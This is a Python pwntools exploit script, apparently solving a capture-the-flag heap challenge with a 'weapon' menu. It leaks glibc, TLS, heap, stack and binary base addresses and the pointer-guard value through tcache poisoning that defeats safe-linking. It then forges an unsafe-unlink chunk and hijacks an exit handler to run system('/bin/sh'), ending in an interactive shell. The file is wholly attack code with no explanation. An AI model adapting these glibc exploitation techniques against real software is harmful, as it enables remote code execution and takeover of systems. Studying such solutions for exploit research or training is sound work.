from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    continue
''')

def build_weapon(index, size):
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b"build weapon at position: ", str(index).encode())
    p.sendlineafter(b"with capacity of: ", str(size).encode())

def launch_weapon(index):
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b"launch weapon at position: ", str(index).encode())

def load_weapon(index, data):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b"load weapon at position: ", str(index).encode())
    p.sendafter(b"with ammo of: ", data)

def check_weapon(index):
    p.sendlineafter(b">> ", b'4')
    p.sendlineafter(b"check weapon at position: ", str(index).encode())
    return p.recvuntil(b"Make a choice:\n", drop=True)

def change_target(data):
    p.sendlineafter(b">> ", b'5')
    p.sendafter(b"upgrade weapon with resource: ", data)

def detonate_bomb():
    p.sendlineafter(b">> ", b'6')

def pointer_guard_encrypt(decrypted: int, pointer_guard: int):
    r_bits = 0x11
    max_bits = 64
    encrypted = ((decrypted^pointer_guard)<<(r_bits%max_bits))&(2**max_bits-1)|(((decrypted^pointer_guard)&(2**max_bits-1))>>(max_bits-(r_bits%max_bits)))
    return encrypted

glibc_e = ELF('./libc.so.6')

build_weapon(0, 0x418)
build_weapon(1, 0x418)
launch_weapon(0)
build_weapon(2, 0x18)
leaks1 = check_weapon(0)
glibc_base_addr = (u64(leaks1[0:8])&~0xfff)-0x203000
log.info(f"glibc base address: {hex(glibc_base_addr)}")
tls_base_addr = glibc_base_addr-0x28c0
log.info(f"tls base address: {hex(tls_base_addr)}")
heap_base_addr = u64(leaks1[0x10:0x18])&~0xfff
log.info(f"heap base address: {hex(heap_base_addr)}")

build_weapon(3, 0x28)
build_weapon(4, 0x28)
build_weapon(5, 0x28)
launch_weapon(4)
launch_weapon(3)
load_weapon(3, p64((tls_base_addr+0x30)^((heap_base_addr+0x2c0)>>12)))
build_weapon(3, 0x28)
build_weapon(4, 0x28)
launch_weapon(5)
leaks2 = check_weapon(5)
pointer_guard_val = u64(leaks2[0:8])^((heap_base_addr+0x320)>>12)^((tls_base_addr+0x30)>>12)
log.info(f"pointer guard value: {hex(pointer_guard_val)}")

build_weapon(6, 0x38)
build_weapon(7, 0x38)
build_weapon(8, 0x38)
launch_weapon(7)
launch_weapon(6)
load_weapon(6, p64((glibc_base_addr+glibc_e.symbols['__libc_argv'])^((heap_base_addr+0x350)>>12)))
build_weapon(6, 0x38)
build_weapon(7, 0x38)
launch_weapon(8)
leaks3 = check_weapon(8)
stack_argv_addr = (u64(leaks3[0:8])^((heap_base_addr+0x3d0)>>12)^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12))
log.info(f"stack argv address: {hex(stack_argv_addr)}")

build_weapon(9, 0x48)
build_weapon(10, 0x48)
build_weapon(11, 0x48)
launch_weapon(10)
launch_weapon(9)
load_weapon(9, p64((stack_argv_addr-0x48)^((heap_base_addr+0x410)>>12)))
build_weapon(9, 0x48)
build_weapon(10, 0x48)
launch_weapon(11)
leaks4 = check_weapon(11)
elf_base_addr = (u64(leaks4[0:8])^((heap_base_addr+0x4b0)>>12)^((stack_argv_addr-0x48)>>12))-0x1140
log.info(f"elf base address: {hex(elf_base_addr)}")

change_target(p64(elf_base_addr+0x1229))
build_weapon(12, 0x1b8)
load_weapon(12, p64(0)+p64(0x1b1)+p64(elf_base_addr+0x40c0-0x18)+p64(elf_base_addr+0x40c0-0x10)+b'\x00'*0x190+p64(0x1b0)+p64(0x420))
build_weapon(13, 0x18)
launch_weapon(1)
load_weapon(12, p64(heap_base_addr+0x410)+p64(heap_base_addr+0x460)+p64(heap_base_addr+0x4b0)+p64(elf_base_addr+0x40c0-0x18)+p64(glibc_base_addr+0x204fc0+0x18))
load_weapon(13, p64(pointer_guard_encrypt(glibc_base_addr+glibc_e.sym.system, pointer_guard_val))+p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00'))))
detonate_bomb()

p.interactive()